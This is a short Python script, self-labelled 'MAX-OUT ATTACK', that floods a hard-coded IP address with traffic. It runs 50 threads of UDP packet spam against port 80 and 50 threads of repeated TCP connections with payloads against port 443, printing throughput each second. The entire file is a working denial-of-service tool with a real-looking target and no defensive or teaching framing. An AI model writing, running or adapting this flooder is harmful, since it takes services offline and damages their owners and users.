import socket
import threading
import time

target = "62.109.121.42"

# GLOBAL COUNTERS
udp_count = 0
tcp_count = 0
start_time = time.time()

# UDP PPS ATTACK
def udp_pps():
    global udp_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(b'X' * 64, (target, 80))
            udp_count += 1
        except:
            pass

# TCP BANDWIDTH ATTACK  
def tcp_bandwidth():
    global tcp_count
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((target, 443))
            sock.send(b'X' * 1460)
            tcp_count += 1
            sock.close()
        except:
            pass

# START 50 THREADS OF EACH
print("🚀 MAX-OUT ATTACK")
print(f"🎯 {target}")
print("💥 UDP: 50 threads (PPS)")
print("💥 TCP: 50 threads (Bandwidth)")

for _ in range(50):
    threading.Thread(target=udp_pps, daemon=True).start()
    threading.Thread(target=tcp_bandwidth, daemon=True).start()

# SIMPLE LOG
last = time.time()
while True:
    time.sleep(1)
    now = time.time()
    
    udp_pps_rate = udp_count / (now - start_time)
    tcp_bw = (tcp_count * 1460 * 8) / (now - start_time) / 1000000
    
    print(f"UDP: {int(udp_pps_rate):,}/s | TCP: {tcp_bw:.1f}Mbps")
    
    udp_count = 0
    tcp_count = 0
    start_time = time.time()
